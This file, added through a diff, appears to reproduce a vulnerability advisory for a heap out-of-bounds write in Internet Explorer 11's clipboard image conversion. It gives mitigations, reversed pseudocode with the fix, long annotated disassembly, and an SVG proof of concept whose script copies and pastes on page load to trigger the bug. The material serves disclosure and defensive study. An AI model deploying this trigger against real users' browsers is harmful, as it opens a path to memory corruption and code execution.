@@ -1,0 +1,786 @@
+<!--
+Source: http://blog.skylined.nl/20161221001.html
+
+Synopsis
+
+A specially crafted web-page can trigger an out-of-bounds write in Microsoft Internet Explorer 11. Code that handles pasting images from the clipboard uses an incorrect buffer length, which allows writing beyond the boundaries of a heap-based buffer. An attacker able to trigger this vulnerability can execute arbitrary code.
+
+Known affected software, attack vectors and potential mitigations
+
+Microsoft Internet Explorer 11.0.9600.16521
+
+An attacker would need to get a target user to open a specially crafted web-page. In order to trigger the issue, the web-page needs to either programmatically copy/paste an image using Javascript or get the user to do this (for instance by tricking the user into typing keyboard shortcuts such as CTRL+C/CTRL+V) . By default, MSIE prompts the user to allow or disallow programmatically copy/pasting the first time a website tries to do this, so user-interaction is normally required in such cases. Disabling the Allow Programmatic clipboard access setting in Internet Options -> Security Settings -> [Choose a zone] -> Scripting should prevent websites from programmatically copy/pasting an image. Disabling execution of scripts on web-pages altogether will have the same effect. Please note that neither option prevents a website from social engineering the user into typing a keyboard shortcut to copy/paste the image.
+
+Details
+
+When an image is pasted in MSHTML, it gets converted from BMP format to PNG. This is done in the MSHTML!CPaste­Command::Convert­Bitmapto­Png function. This function incorrectly uses the size of the original BMP image to allocate memory for storing the converted PNG image. The PNG image will be smaller than the BMP under most circumstances, but if a specially crafted image leads to the original BMP image being smaller than the converted PNG, the function will write PNG data beyond the bounds of the allocated memory.
+
+Here is some pseudo code that was created by reverse engineering the CPaste­Command::Convert­Bitmapto­Png function, which shows the vulnerability:
+
+Convert­Bitmapto­Png(
+  [IN] VOID* po­Bitmap,  UINT u­Bitmap­Size,
+  [OUT] VOID** ppo­Png­Image, UINT* pu­Png­Image­Size
+) {
+  // Convert a BMP formatted image to a PNG formatted image.
+  CMem­Stm* po­CMem­Stm;
+  IWICStream* po­Wic­Bitmap;
+  STATSTG o­Stat­Stg;
+  TSmart­Array<unsigned char> po­Png­Image;
+  UINT u­Read­Size;
+  // Create a CMem­Stm for the PNG image.
+  Create­Stream­On­HGlobal(NULL, True, po­CMem­Stm);
+  // Create an IWICStream from the BMP image.
+  Initialize­From­Memory(po­Bit­Map, u­Bitmap­Size,
+      &GUID_­Container­Format­Bmp, &po­Wic­Bitmap)));
+  // Write BMP image in IWICStream to PNG image in CMem­Stm
+  Write­Wic­Bitmap­To­Stream(po­Wic­Bitmap, &GUID_­Container­Format­Png, po­CMem­Stm);
+  // Get size of PNG image in CMem­Stm and save it to the output variable.
+  o­CMem­Stm->Stat(&o­Stat­Stg, 0);
+  *pu­Png­Image­Size = o­Stat­Stg.cb­Size.Low­Part;
+  // Allocate memory for the PNG
+  po­Png­Image->New(u­Bitmap­Size);
+  // Go to start of PNG image in CMem­Stm
+  po­CMem­Stm->Seek(0, STREAM_­SEEK_­SET, NULL, &p­Position­Low);
+  // Read PNG image in CMem­Stm to allocated memory.
+  po­CMem­Stm->Read(po­Png­Image, *pu­Png­Image­Size, &u­Read­Size);
+  // Save location of allocated memory with PNG image to output variable.
+  *ppo­Png­Image = po­Png­Image;
+}
+
+Notes:
+
+The code uses the wrong size to allocate memory in po­Png­Image->New(u­Bitmap­Size);. Changing this line of code to po­Png­Image->New(*pu­Png­Image­Size); should address the issue.
+The PNG image is written to the allocated memory in po­CMem­Stm->Read(po­Png­Image, *pu­Png­Image­Size, &u­Read­Size);. This is where the code can potentially write beyond the boundaries of the allocated memory if u­Bitmap­Size is smaller than *pu­Png­Image­Size.
+
+Repro.svg:
+-->
+
+<svg style="width:1px; height: 1px;" xmlns="http://www.w3.org/2000/svg">
+  <script>
+    window.onload = function () {
+      document.design­Mode="on";
+      document.exec­Command("Select­All");/*exec*/
+      window.get­Selection().collapse­To­End();/*js_­om*/
+      document.exec­Command("Copy");/*exec*/
+      document.exec­Command("Paste", false);/*exec*/
+    }
+  </script>
+</svg>
+
+<!--
+Below are my notes from reversing the code for your viewing pleasure. There are a few flaws/omissions in the parts that are not directly relevant to the bug, as I did not attempt to finish all the details after I figured out enough to determine root cause, exploitability and attack vectors.
+
+MSHTML!CPaste­Command..Convert­Bitmapto­Png.txt
+MSHTML!CPaste­Command::Convert­Bitmapto­Png(                                                                                                                       
+    VOID* po­Bitmap<ebp+8>,                                                                                                                                      
+    UINT u­Bitmap­Size<ebp+c>,                                                                                                                                    
+    BYTE[]** ppo­Png­Image<ebp+10>,                                                                                                                               
+    UINT* pu­Png­Image­Size<ebp+14>):                                                                                                                            
+-50 STATSTG o­Stat­Stg {                                                                                                                                          
+  -50 00 04 LPOLESTR       pwcs­Name;                                                                                                                            
+  -4C 04 04 DWORD          type;                                                                                                                                
+  -48 08 08 ULARGE_­INTEGER cb­Size;                                                                                                                              
+  -40 10 08 FILETIME       mtime;                                                                                                                               
+  -38 18 08 FILETIME       ctime;                                                                                                                               
+  -30 20 08 FILETIME       atime;                                                                                                                               
+  -28 28 04 DWORD          grf­Mode;                                                                                                                             
+  -24 2C 04 DWORD          grf­Locks­Supported;                                                                                                                   
+  -20 30 10 CLSID          clsid;                                                                                                                               
+  -10 34 04 DWORD          grf­State­Bits;                                                                                                                        
+  -0C 38 04 DWORD          reserved;                                                                                                                            
+} size = 3C                                                                                                                                                     
+-54 CMem­Stm* po­CMem­Stm                                                                                                                                          
+-58 VOID* po­Wic­Bitmap                                                                                                                                           
+-5C UCHAR[]* po­Png­Image (TSmart­Array)                                                                                                                                        
+-60 UINT u­Read­Size                                                                                                                                              
+-64 BYTE[]** ppo­Png­Image                                                                                                                                        
+-70 DWORD p­Position­Low // lower DWORD of 64 bit position in stream.                                                                                             
+                                                                                                                                                                
+6f3818fd 8bff            mov     edi,edi                                                                                                                        
+6f3818ff 55              push    ebp                                                                                                                            
+6f381900 8bec            mov     ebp,esp                                                                                                                        
+6f381902 83ec74          sub     esp,74h                                                                                                                        
+6f381905 a13c03436f      mov     eax,dword ptr [MSHTML!__security_­cookie (6f43033c)]                                                                            
+6f38190a 33c5            xor     eax,ebp                                                                                                                        
+6f38190c 8945fc          mov     dword ptr [ebp-4],eax                                                                                                          
+6f38190f 8b4510          mov     eax,dword ptr [ebp+10h]                        ppo­Png­Image<eax> = ppo­Png­Image<stack>                                           
+6f381912 8d4dac          lea     ecx,[ebp-54h]                                  &po­CMem­Stm<ecx> = &po­CMem­Stm<stack>                                             
+6f381915 53              push    ebx                                            //save reg                                                                      
+6f381916 8b5d14          mov     ebx,dword ptr [ebp+14h]                        pu­Png­Image­Size<ebx> = pu­Png­Image­Size<stack>                                     
+6f381919 56              push    esi                                            //save reg                                                                      
+6f38191a 8b7508          mov     esi,dword ptr [ebp+8]                          po­Bitmap<esi> = po­Bitmap<ebp+8>                                                 
+6f38191d 57              push    edi                                            //save reg                                                                      
+6f38191e 33ff            xor     edi,edi                                        <edi> = 0                                                                       
+6f381920 89459c          mov     dword ptr [ebp-64h],eax                        ppo­Png­Image<stack> = ppo­Png­Image<eax>                                           
+6f381923 897da8          mov     dword ptr [ebp-58h],edi                        po­Wic­Bitmap<stack> = 0<edi>                                                     po­Wic­Bitmap = 0
+6f381926 897dac          mov     dword ptr [ebp-54h],edi                        po­CMem­Stm<stack> = 0<edi>                                                       po­CMem­Stm = 0
+6f381929 e8566827ff      call    6e5f8184                                       p­Smart­Stream­Pointer<eax> = MSHTML!TSmart­Pointer<                                p­Smart­Stream­Pointer = &(TSmart­Pointer<...>(&po­CMem­Stm))
+                                                                                  Windows::Foundation::IAsync­Operation<                                         
+                                                                                    Windows::Storage::Streams::IRandom­Access­Stream *                            
+                                                                                  >                                                                             
+                                                                                >::operator&(                                                                   
+                                                                                    &po­CMem­Stm)                                                                 
+6f38192e 50              push    eax                                            larg3<stack> = p­Smart­Stream­Pointer<eax>                                         
+6f38192f 6a01            push    1                                              larg2<stack> = 1                                                                
+6f381931 57              push    edi                                            larg1<stack> = 0<edi>                                                           
+6f381932 ff1520c0426f    call    dword ptr [6f42c020]                           HRESULT h­Result<eax> = combase!Create­Stream­On­HGlobal(                           if (FAILED(h­Result = combase!Create­Stream­On­HGlobal(NULL, True, p­Smart­Stream­Pointer)))
+                                                                                    h­Global = NULL,                                                             
+                                                                                    f­Delete­On­Release = True,                                                    
+                                                                                    ppstm = p­Smart­Stream­Pointer<eax>);                                          
+6f381938 8bf8            mov     edi,eax                                        h­Result<edi> = h­Result<eax>                                                     
+6f38193a 85ff            test    edi,edi                                        if (h­Result<edi> < 0)                                                           
+6f38193c 0f88b8000000    js      6f3819fa                                           goto exit_­label_1                                                               goto exit_­label_1;
+6f381942 8b550c          mov     edx,dword ptr [ebp+0Ch]                        larg1<edx> = u­Bitmap­Size<stack>                                                 
+6f381945 8d45a8          lea     eax,[ebp-58h]                                  &po­Wic­Bitmap<eax> = &(po­Wic­Bitmap<stack>)                                       
+6f381948 50              push    eax                                            larg3<stack> = &po­Wic­Bitmap<eax>                                                
+6f381949 6860147a6e      push    6e7a1460                                       larg2<stack> = &GUID_­Container­Format­Bmp                                         
+6f38194e 8bce            mov     ecx,esi                                        larg1<ecx> = po­Bitmap<esi>                                                  
+6f381950 e8c8325dff      call    6e954c1d                                       h­Result<eax> = MSHTML!Initialize­From­Memory(                                     if (FAILED(h­Result = Initialize­From­Memory(po­Bit­Map, u­Bitmap­Size, &GUID_­Container­Format­Bmp, &po­Wic­Bitmap)))
+                                                                                    po­Bitmap,                                                                   
+                                                                                    u­Bitmap­Size,                                                                
+                                                                                    &GUID_­Container­Format­Bmp<dll>,                                              
+                                                                                    &po­Wic­Bitmap);                                                              
+6f381955 8bf8            mov     edi,eax                                        h­Result<edi> = h­Result<eax>                                                     
+6f381957 85ff            test    edi,edi                                        if (h­Result < 0)                                                                
+6f381959 0f889b000000    js      6f3819fa                                           goto exit_­label_1                                                               goto exit_­label_1;
+6f38195f ff75ac          push    dword ptr [ebp-54h]                            larg3<stack> = po­CMem­Stm<stack>                                                 
+6f381962 8b4da8          mov     ecx,dword ptr [ebp-58h]                        larg1<ecx> = po­Wic­Bitmap<stack>                                             
+6f381965 ba24a4736e      mov     edx,6e73a424                                   larg2<edx> = &GUID_­Container­Format­Png<dll>                                      
+6f38196a e8e4f6e6ff      call    6f1f1053                                       h­Result<eax> = MSHTML!Write­Wic­Bitmap­To­Stream(                                   if (FAILED(h­Result = Write­Wic­Bitmap­To­Stream(po­Wic­Bitmap, &GUID_­Container­Format­Png, po­CMem­Stm)))
+                                                                                    po­Wic­Bitmap,                                                                
+                                                                                    &GUID_­Container­Format­Png,                                                   
+                                                                                    po­CMem­Stm)                                                                  
+6f38196f 8bf8            mov     edi,eax                                        h­Result<edi> = h­Result<eax>                                                     
+6f381971 85ff            test    edi,edi                                        if (h­Result<edi> < 0)                                                           
+6f381973 0f8881000000    js      6f3819fa                                           goto exit_­label_1                                                               goto exit_­label_1;
+6f381979 8b45ac          mov     eax,dword ptr [ebp-54h]                        po­CMem­Stm<eax> = po­CMem­Stm<stack>                                               
+6f38197c 8d55b0          lea     edx,[ebp-50h]                                  &o­Stat­Stg<edx> = &(o­Stat­Stg<stack>)                                             
+6f38197f 33f6            xor     esi,esi                                        0<esi> = 0                                                                      
+6f381981 56              push    esi                                            larg3<stack> = 0<esi>                                                           
+6f381982 52              push    edx                                            larg2<stack> = &o­Stat­Stg<edx>                                                   
+6f381983 8b08            mov     ecx,dword ptr [eax]                            af­VFTable<ecx> = po­CMem­Stm<eax>->af­VFTable                                      
+6f381985 50              push    eax                                            larg1<stack> = po­CMem­Stm<eax>                                               
+6f381986 ff5130          call    dword ptr [ecx+30h]                            h­Result<eax> = po­CMem­Stm->Stat(&o­Stat­Stg, 0)                                    if (FAILED(h­Result = po­CMem­Stm->Stat(&o­Stat­Stg, 0)))
+6f381989 8bf8            mov     edi,eax                                        h­Result<edi> = h­Result<eax>                                                     
+6f38198b 85ff            test    edi,edi                                        if (h­Result<edi> < 0)                                                           
+6f38198d 786b            js      6f3819fa                                           goto exit_­label_1                                                               goto exit_­label_1;
+6f38198f 8b45b8          mov     eax,dword ptr [ebp-48h]                        u­Png­Image­Size<eax> = o­Stat­Stg<stack>.cb­Size.Low­Part                             
+6f381992 8d4da4          lea     ecx,[ebp-5Ch]                                  &po­Png­Image<ecx> = &(po­Png­Image<stack>)                                         
+6f381995 ff750c          push    dword ptr [ebp+0Ch]                            u­Bitmap­Size<stack> = u­Bitmap­Size<stack>                                         
+6f381998 8903            mov     dword ptr [ebx],eax                            *pu­Png­Image­Size<ebx> = u­Png­Image­Size<eax>                                       *pu­Png­Image­Size = o­Stat­Stg.cb­Size.Low­Part
+6f38199a 8975a4          mov     dword ptr [ebp-5Ch],esi                        po­Png­Image<stack> = 0<esi>                                                      ppo­Png­Image = NULL
+6f38199d e8c34453ff      call    6e8b5e65                                       MSHTML!TSmart­Array<unsigned char>::New(                                         if (FAILED(h­Result = po­Png­Image->New(u­Bitmap­Size)))
+                                                                                    u­Bitmap­Size<stack>)                                                         
+6f3819a2 8bf8            mov     edi,eax                                        h­Result<edi> = h­Result<eax>                                                     
+6f3819a4 85ff            test    edi,edi                                        if (h­Result<edi> >= 0)                                                          
+6f3819a6 7905            jns     6f3819ad                                           goto skip_1                                                                 
+                                                                                free_­and_­exit_­label_2:                                                          
+6f3819a8 8b4da4          mov     ecx,dword ptr [ebp-5Ch]                        po­Png­Image<ecx> = po­Png­Image<stack>                                             goto free_­po­Png­Image_­and_­exit
+6f3819ab eb48            jmp     6f3819f5                                       goto free_­and_­exit_­label_1                                                      
+                                                                                skip_1:                                                                         
+6f3819ad 8b45ac          mov     eax,dword ptr [ebp-54h]                        po­CMem­Stm<eax> = po­CMem­Stm<stack>                                               
+6f3819b0 8d5590          lea     edx,[ebp-70h]                                  &p­Position­Low<edx> = &(p­Position­Low<stack>)                                     
+6f3819b3 52              push    edx                                            larg3.2 = &p­Position­Low<edx>                                                    
+6f3819b4 56              push    esi                                            larg3.1 = 0<esi>                                                                
+6f3819b5 56              push    esi                                            larg2.2 = 0<esi>                                                                
+6f3819b6 8b08            mov     ecx,dword ptr [eax]                            af­VFTable<ecx> = po­CMem­Stm<eax>->af­VFTable                                      
+6f3819b8 56              push    esi                                            larg2.1 = 0<esi>                                                                
+6f3819b9 50              push    eax                                            larg1 = po­CMem­Stm<eax>                                                      
+6f3819ba ff5114          call    dword ptr [ecx+14h]                            h­Result<eax> = po­CMem­Stm->Seek(                                                 if (FAILED(h­Result = po­CMem­Stm->Seek(0, STREAM_­SEEK_­SET, NULL, &p­Position­Low)))
+                                                                                    0,                                                                          
+                                                                                    STREAM_­SEEK_­SET,                                                            
+                                                                                    NULL,                                                                       
+                                                                                    &p­Position­Low)                                                              
+6f3819bd 8bf8            mov     edi,eax                                        h­Result<edi> = h­Result<eax>                                                     
+6f3819bf 85ff            test    edi,edi                                        if (h­Result<edi> < 0)                                                           
+6f3819c1 78e5            js      6f3819a8                                           goto free_­and_­exit_­label_2                                                      goto free_­po­Png­Image_­and_­exit
+6f3819c3 8b45ac          mov     eax,dword ptr [ebp-54h]                        po­CMem­Stm<eax> = po­CMem­Stm<stack>                                               
+6f3819c6 8d55a0          lea     edx,[ebp-60h]                                  &u­Read­Size<edx> = &(u­Read­Size<stack>)                                           
+6f3819c9 8b75a4          mov     esi,dword ptr [ebp-5Ch]                        po­Png­Image<esi> = po­Png­Image<stack>                                             
+6f3819cc 52              push    edx                                            larg4 = &u­Read­Size<edx>                                                         
+6f3819cd ff33            push    dword ptr [ebx]                                larg3 = *pu­Png­Image­Size<ebx>                                                    
+6f3819cf 8b08            mov     ecx,dword ptr [eax]                            af­VFTable<ecx> = po­CMem­Stm<eax>->af­VFTable                                      
+6f3819d1 56              push    esi                                            larg2 = po­Png­Image<esi>                                                         
+6f3819d2 50              push    eax                                            larg1 = <eax>                                                               
+6f3819d3 ff510c          call    dword ptr [ecx+0Ch]                            h­Result = po­CMem­Stm->Read(                                                      if (FAILED(po­CMem­Stm->Read(po­Png­Image, *pu­Png­Image­Size, &u­Read­Size)))
+                                                                                    po­Png­Image,                                                                 
+       **************                                                               *pu­Png­Image­Size,                                                            
+                                                                                    &u­Read­Size)                                                                 
+6f3819d6 8bf8            mov     edi,eax                                        h­Result<edi> = h­Result<eax>                                                     
+6f3819d8 85ff            test    edi,edi                                        if (h­Result<edi> >= 0)                                                              goto free_­po­Png­Image_­and_­exit
+6f3819da 7904            jns     6f3819e0                                           goto skip_­label_2                                                           
+6f3819dc                                                                        goto free_­and_­exit_­label_3                                                      
+                                                                                skip_­label_2:                                                                   
+6f3819e0 8b03            mov     eax,dword ptr [ebx]                            u­Png­Info­Size<eax> = *pu­Png­Image­Size<ebx>                                        
+6f3819e2 3b45a0          cmp     eax,dword ptr [ebp-60h]                        if (u­Png­Info­Size<eax> == u­Read­Size<stack>)                                      if (u­Png­Info­Size != u­Read­Size) {
+6f3819e5 7407            je      6f3819ee                                           goto skip_­label_3                                                           
+6f3819e7 bfffff0080      mov     edi,8000FFFFh                                  h­Result<edi> = 0x8000FFFF (Error: Catastrophic failure)                             h­Result = 0x8000FFFF (Error: Catastrophic failure)
+6f3819ec ebee            jmp     6f3819dc                                       goto free_­and_­exit_­label_3                                                          goto free_­po­Png­Image_­and_­exit
+                                                                                free_­and_­exit_­label_3:                                                          }
+6f3819dc 8bce            mov     ecx,esi                                        po­Png­Image<ecx> = po­Png­Image<esi>                                               
+6f3819de eb15            jmp     6f3819f5                                           goto free_­and_­exit_­label_1                                                  
+                                                                                                                                                                
+                                                                                skip_­label_3:                                                                   
+6f3819ee 8b459c          mov     eax,dword ptr [ebp-64h]                        ppo­Png­Image<eax> = ppo­Png­Image<stack>                                           
+6f3819f1 33c9            xor     ecx,ecx                                        po­Png­Image<ecx> = NULL                                                          
+6f3819f3 8930            mov     dword ptr [eax],esi                            *ppo­Png­Image<eax> = po­Png­Image<esi>                                             *ppo­Png­Image = po­Png­Image, po­Png­Image = NULL
+                                                                                                                                                                
+                                                                                free_­and_­exit_­label_1:                                                          free_­po­Png­Image_­and_­exit:
+6f3819f5 e881f620ff      call    6e59107b                                       MSHTML!Process­Heap­Free(po­Png­Image<ecx>)                                         Process­Heap­Free(po­Png­Image)
+exit_­label_1:                                                                                                                                                   
+6f3819fa 8d4dac          lea     ecx,[ebp-54h]                                  &po­CMem­Stm<ecx> = &(po­CMem­Stm<stack>)                                           
+6f3819fd e89f4b25ff      call    6e5d65a1                                       MSHTML!SP<Tree::Grid­Track­List>::~SP<Tree::Grid­Track­List>(                       
+                                                                                    &po­CMem­Stm<ecx>)                                                            
+6f381a02 8d4da8          lea     ecx,[ebp-58h]                                  &po­Wic­Bitmap<ecx> = &(po­Wic­Bitmap<stack>)                                       
+6f381a05 e8974b25ff      call    6e5d65a1                                       MSHTML!SP<Tree::Grid­Track­List>::~SP<Tree::Grid­Track­List>(                       
+                                                                                    &po­Wic­Bitmap<ecx>)                                                          
+6f381a0a 8b4dfc          mov     ecx,dword ptr [ebp-4]                                                                                                          
+6f381a0d 8bc7            mov     eax,edi                                        return h­Result<edi>                                                             
+6f381a0f 5f              pop     edi                                                                                                                            
+6f381a10 5e              pop     esi                                                                                                                            
+6f381a11 33cd            xor     ecx,ebp                                                                                                                        
+6f381a13 5b              pop     ebx                                                                                                                            
+6f381a14 e8f7f520ff      call    MSHTML!__security_­check_­cookie (6e591010)                                                                                      
+6f381a19 8be5            mov     esp,ebp                                                                                                                        
+6f381a1b 5d              pop     ebp                                                                                                                            
+6f381a1c c21000          ret     10h                                                                                                                            
+6f381a1f 90              nop                                                                                                                                    
+6f381a20 90              nop                                                                                                                                    
+6f381a21 90              nop                                                                                                                                    
+6f381a22 90              nop                                                                                                                                    
+6f381a23 90              nop                                                                                                                                    
+                                                                                                                                                                
+MSHTML!CPaste­Command..Paste­From­Clipboard.txt
+MSHTML!CPaste­Command::Paste­From­Clipboard(
+    self<ecx>,
+    x­Arg1<ebp+8>,
+    x­Arg2<ebp+C>,
+    x­Arg3<ebp+10>,
+    x­Arg4<ebp+14>,
+    x­Arg5<ebp+18>,
+    x­Arg6<ebp+1C>,
+    x­Arg7<ebp+20>,
+    x­Arg8<ebp+24>):
+esp+34 = VOID* var34 (po­Bitmap)
+esp+38 = BYTE[]* var38 (pab­Image­Data)
+esp+4C = UINT var4C (u­Bitmap­Size)
+esp+50 = UINT var50 (u­Bitmap­Info­Size / u­Png­Image­Size)
+
+MSHTML!CPaste­Command::Paste­From­Clipboard:
+
+72cf6235 8bff            mov     edi,edi
+72cf6237 55              push    ebp
+72cf6238 8bec            mov     ebp,esp
+72cf623a 83e4f8          and     esp,0FFFFFFF8h
+72cf623d 83ec74          sub     esp,74h
+72cf6240 53              push    ebx
+72cf6241 56              push    esi
+72cf6242 57              push    edi
+72cf6243 8bd9            mov     ebx,ecx
+72cf6245 e8b1cdfdff      call    MSHTML!CCommand::Doc (72cd2ffb)
+72cf624a 50              push    eax
+72cf624b 8d4c2478        lea     ecx,[esp+78h]
+72cf624f e86fb1afff      call    MSHTML!CPaste­Operation­State::CPaste­Operation­State (727f13c3)
+72cf6254 33ff            xor     edi,edi
+72cf6256 8bcb            mov     ecx,ebx
+72cf6258 897c243c        mov     dword ptr [esp+3Ch],edi
+72cf625c 897c2410        mov     dword ptr [esp+10h],edi
+72cf6260 897c2430        mov     dword ptr [esp+30h],edi
+72cf6264 897c2468        mov     dword ptr [esp+68h],edi
+72cf6268 897c246c        mov     dword ptr [esp+6Ch],edi
+72cf626c 897c2470        mov     dword ptr [esp+70h],edi
+72cf6270 897c2414        mov     dword ptr [esp+14h],edi
+72cf6274 897c2424        mov     dword ptr [esp+24h],edi
+72cf6278 e87ecdfdff      call    MSHTML!CCommand::Doc (72cd2ffb)
+72cf627d 8b4b08          mov     ecx,dword ptr [ebx+8]
+72cf6280 8bf0            mov     esi,eax
+72cf6282 83c110          add     ecx,10h
+72cf6285 897c2428        mov     dword ptr [esp+28h],edi
+72cf6289 897c242c        mov     dword ptr [esp+2Ch],edi
+72cf628d 897c2440        mov     dword ptr [esp+40h],edi
+72cf6291 6a01            push    1
+72cf6293 8b01            mov     eax,dword ptr [ecx]
+72cf6295 89742454        mov     dword ptr [esp+54h],esi
+72cf6299 897c241c        mov     dword ptr [esp+1Ch],edi
+72cf629d 897c2420        mov     dword ptr [esp+20h],edi
+72cf62a1 ff503c          call    dword ptr [eax+3Ch]
+72cf62a4 56              push    esi
+72cf62a5 8d4c2460        lea     ecx,[esp+60h]
+72cf62a9 8944245c        mov     dword ptr [esp+5Ch],eax
+72cf62ad 897c2464        mov     dword ptr [esp+64h],edi
+72cf62b1 e8899265ff      call    MSHTML!CEnable­Deferring­Accessibility­Events::CEnable­Deferring­Accessibility­Events (7234f53f)
+72cf62b6 8b7d08          mov     edi,dword ptr [ebp+8]
+72cf62b9 8bcf            mov     ecx,edi
+72cf62bb 8b07            mov     eax,dword ptr [edi]
+72cf62bd ff9080000000    call    dword ptr [eax+80h]
+72cf62c3 85c0            test    eax,eax
+72cf62c5 0f84fd050000    je      MSHTML!CPaste­Command::Paste­From­Clipboard+0x693 (72cf68c8)
+72cf62cb 8b4d0c          mov     ecx,dword ptr [ebp+0Ch]
+72cf62ce 8b01            mov     eax,dword ptr [ecx]
+72cf62d0 ff9080000000    call    dword ptr [eax+80h]
+72cf62d6 85c0            test    eax,eax
+72cf62d8 0f84ea050000    je      MSHTML!CPaste­Command::Paste­From­Clipboard+0x693 (72cf68c8)
+72cf62de 837d2000        cmp     dword ptr [ebp+20h],0
+72cf62e2 741c            je      MSHTML!CPaste­Command::Paste­From­Clipboard+0xcb (72cf6300)
+72cf62e4 8bcb            mov     ecx,ebx
+72cf62e6 e810cdfdff      call    MSHTML!CCommand::Doc (72cd2ffb)
+72cf62eb 8bf0            mov     esi,eax
+72cf62ed 8bcf            mov     ecx,edi
+72cf62ef 8b07            mov     eax,dword ptr [edi]
+72cf62f1 ff5078          call    dword ptr [eax+78h]
+72cf62f4 50              push    eax
+72cf62f5 8d8e7c010000    lea     ecx,[esi+17Ch]
+72cf62fb e8bd2967ff      call    MSHTML!TSmart­Pointer<CMarkup>::operator= (72368cbd)
+72cf6300 8b4b08          mov     ecx,dword ptr [ebx+8]
+72cf6303 8d542418        lea     edx,[esp+18h]
+72cf6307 8d4910          lea     ecx,[ecx+10h]
+72cf630a e8ea7062ff      call    MSHTML!Create­Markup­Pointer2 (7231d3f9)
+72cf630f 8bf0            mov     esi,eax
+72cf6311 85f6            test    esi,esi
+72cf6313 0f88b4050000    js      MSHTML!CPaste­Command::Paste­From­Clipboard+0x698 (72cf68cd)
+72cf6319 8b4c2418        mov     ecx,dword ptr [esp+18h]
+72cf631d 57              push    edi
+72cf631e 51              push    ecx
+72cf631f 8b01            mov     eax,dword ptr [ecx]
+72cf6321 ff5030          call    dword ptr [eax+30h]
+72cf6324 8bf0            mov     esi,eax
+72cf6326 85f6            test    esi,esi
+72cf6328 0f889f050000    js      MSHTML!CPaste­Command::Paste­From­Clipboard+0x698 (72cf68cd)
+72cf632e 8b4c2418        mov     ecx,dword ptr [esp+18h]
+72cf6332 6a00            push    0
+72cf6334 51              push    ecx
+72cf6335 8b01            mov     eax,dword ptr [ecx]
+72cf6337 ff5014          call    dword ptr [eax+14h]
+72cf633a 8bf0            mov     esi,eax
+72cf633c 85f6            test    esi,esi
+72cf633e 0f8889050000    js      MSHTML!CPaste­Command::Paste­From­Clipboard+0x698 (72cf68cd)
+72cf6344 8b4b08          mov     ecx,dword ptr [ebx+8]
+72cf6347 8d54241c        lea     edx,[esp+1Ch]
+72cf634b 8d4910          lea     ecx,[ecx+10h]
+72cf634e e8a67062ff      call    MSHTML!Create­Markup­Pointer2 (7231d3f9)
+72cf6353 8bf0            mov     esi,eax
+72cf6355 85f6            test    esi,esi
+72cf6357 0f8870050000    js      MSHTML!CPaste­Command::Paste­From­Clipboard+0x698 (72cf68cd)
+72cf635d 8b4c241c        mov     ecx,dword ptr [esp+1Ch]
+72cf6361 57              push    edi
+72cf6362 51              push    ecx
+72cf6363 8b01            mov     eax,dword ptr [ecx]
+72cf6365 ff5030          call    dword ptr [eax+30h]
+72cf6368 8bf0            mov     esi,eax
+72cf636a 85f6            test    esi,esi
+72cf636c 0f885b050000    js      MSHTML!CPaste­Command::Paste­From­Clipboard+0x698 (72cf68cd)
+72cf6372 8b4c241c        mov     ecx,dword ptr [esp+1Ch]
+72cf6376 6a01            push    1
+72cf6378 51              push    ecx
+72cf6379 8b01            mov     eax,dword ptr [ecx]
+72cf637b ff5014          call    dword ptr [eax+14h]
+72cf637e 8bf0            mov     esi,eax
+72cf6380 85f6            test    esi,esi
+72cf6382 0f8845050000    js      MSHTML!CPaste­Command::Paste­From­Clipboard+0x698 (72cf68cd)
+72cf6388 8b03            mov     eax,dword ptr [ebx]
+72cf638a 8d4c2448        lea     ecx,[esp+48h]
+72cf638e 51              push    ecx
+72cf638f 8d4c2458        lea     ecx,[esp+58h]
+72cf6393 51              push    ecx
+72cf6394 8d4c241c        lea     ecx,[esp+1Ch]
+72cf6398 51              push    ecx
+72cf6399 8bcb            mov     ecx,ebx
+72cf639b ff5030          call    dword ptr [eax+30h]
+72cf639e 8bf0            mov     esi,eax
+72cf63a0 85f6            test    esi,esi
+72cf63a2 0f8825050000    js      MSHTML!CPaste­Command::Paste­From­Clipboard+0x698 (72cf68cd)
+72cf63a8 8b442450        mov     eax,dword ptr [esp+50h]
+72cf63ac 85c0            test    eax,eax
+72cf63ae 741e            je      MSHTML!CPaste­Command::Paste­From­Clipboard+0x199 (72cf63ce)
+72cf63b0 6afe            push    0FFFFFFFEh
+72cf63b2 59              pop     ecx
+72cf63b3 663b88840e0000  cmp     cx,word ptr [eax+0E84h]
+72cf63ba 7512            jne     MSHTML!CPaste­Command::Paste­From­Clipboard+0x199 (72cf63ce)
+72cf63bc 66894c2464      mov     word ptr [esp+64h],cx
+72cf63c1 33c9            xor     ecx,ecx
+72cf63c3 89442460        mov     dword ptr [esp+60h],eax
+72cf63c7 668988840e0000  mov     word ptr [eax+0E84h],cx
+72cf63ce 837d1000        cmp     dword ptr [ebp+10h],0
+72cf63d2 7558            jne     MSHTML!CPaste­Command::Paste­From­Clipboard+0x1f7 (72cf642c)
+72cf63d4 8d44243c        lea     eax,[esp+3Ch]
+72cf63d8 50              push    eax
+72cf63d9 ff15b8c1d972    call    dword ptr [MSHTML!_imp__­Ole­Get­Clipboard (72d9c1b8)]
+72cf63df 8bf0            mov     esi,eax
+72cf63e1 85f6            test    esi,esi
+72cf63e3 0f85e4040000    jne     MSHTML!CPaste­Command::Paste­From­Clipboard+0x698 (72cf68cd)
+72cf63e9 8d44242c        lea     eax,[esp+2Ch]
+72cf63ed 50              push    eax
+72cf63ee b8c0bfff71      mov     eax,offset MSHTML!IID_­IDoc­Host­UIHandler (71ffbfc0)
+72cf63f3 50              push    eax
+72cf63f4 50              push    eax
+72cf63f5 8b4308          mov     eax,dword ptr [ebx+8]
+72cf63f8 ff7018          push    dword ptr [eax+18h]
+72cf63fb e854465dff      call    MSHTML!CDocument::Query­Service (722caa54)
+72cf6400 8b4c242c        mov     ecx,dword ptr [esp+2Ch]
+72cf6404 8b54243c        mov     edx,dword ptr [esp+3Ch]
+72cf6408 895510          mov     dword ptr [ebp+10h],edx
+72cf640b 85c9            test    ecx,ecx
+72cf640d 741d            je      MSHTML!CPaste­Command::Paste­From­Clipboard+0x1f7 (72cf642c)
+72cf640f 8b01            mov     eax,dword ptr [ecx]
+72cf6411 8d742428        lea     esi,[esp+28h]
+72cf6415 56              push    esi
+72cf6416 52              push    edx
+72cf6417 51              push    ecx
+72cf6418 ff5044          call    dword ptr [eax+44h]
+72cf641b 85c0            test    eax,eax
+72cf641d 750d            jne     MSHTML!CPaste­Command::Paste­From­Clipboard+0x1f7 (72cf642c)
